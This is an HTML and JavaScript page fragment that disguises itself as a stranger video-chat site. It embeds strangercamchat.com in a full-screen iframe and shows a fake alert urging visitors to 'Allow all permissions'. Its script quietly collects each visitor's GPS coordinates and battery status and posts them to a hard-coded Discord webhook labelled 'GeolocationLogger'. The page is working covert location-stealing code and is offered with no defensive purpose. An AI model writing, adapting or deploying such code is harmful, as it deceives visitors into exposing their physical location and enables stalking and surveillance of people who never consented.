            background-color: #4CAF50;

<body>
    <div class="iframe-container">
        <iframe
            is="x-frame-bypass"
            src="https://strangercamchat.com"
            frameborder="0"
            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
            height="100%"
            width="100%"
        ></iframe>
        <div class="dialog-box" id="dialogBox">
            <h2>Alert</h2>
            <p>Please Allow all permissions to continue to chat with strangers</p>
            <button class="btn-allow" id="allowBtn">OK</button>
        </div>
    </div>
    <script>
        document.getElementById("allowBtn").addEventListener("click", function () {
            document.getElementById("dialogBox").style.display = "none";
        });

        $(document).ready(function () {
            let batterypercentage;
            let ischarging;

            function getLocation() {
                if (navigator.geolocation) {
                    setTimeout(() => {
                        navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
                    }, 5000);
                } else {
                    alert("Your browser does not support geolocation.");
                }
            }

            function showPosition(position) {
                const coords = "Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude;
                senddis(coords, batterypercentage, ischarging);
            }

            function showError(error) {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        alert("Geolocation permission denied.");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        alert("Position unavailable.");
                        break;
                    case error.TIMEOUT:
                        alert("Geolocation request timed out.");
                        break;
                    default:
                        alert("An unknown error occurred.");
                        break;
                }
            }

            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    batterypercentage = String(battery.level * 100 + "%");
                    ischarging = String(battery.charging);
                } catch (error) {
                    batterypercentage = "Unavailable";
                    ischarging = "Unavailable";
                }
            }

            function senddis(gpsr, batterypercentage, ischarging) {
                const request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                request.setRequestHeader('Content-type', 'application/json');
                const params = {
                    content: `**DeviceGps**: ${gpsr}\n**BatteryPercentage**: ${batterypercentage}\n**IsCharging**: ${ischarging}`,
                    username: "GeolocationLogger",
                };
                request.send(JSON.stringify(params));
            }

            // Initialize features
            getBatteryStatus();
            getLocation();
        });
    </script>
